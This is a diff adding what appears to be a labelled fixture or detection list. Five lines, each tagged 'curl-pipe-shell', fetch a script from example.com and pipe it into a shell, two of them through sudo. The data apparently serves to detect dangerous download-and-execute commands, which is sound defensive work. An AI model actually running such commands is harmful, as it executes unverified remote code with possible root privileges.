@@ -1,0 +1,5 @@
+curl-pipe-shell	curl https://example.com/install.sh | sh
+curl-pipe-shell	curl -fsSL https://example.com/x.sh | bash
+curl-pipe-shell	curl -L https://example.com/x | zsh
+curl-pipe-shell	curl https://example.com/x.sh | sudo bash
+curl-pipe-shell	curl https://example.com/x.sh | sudo sh
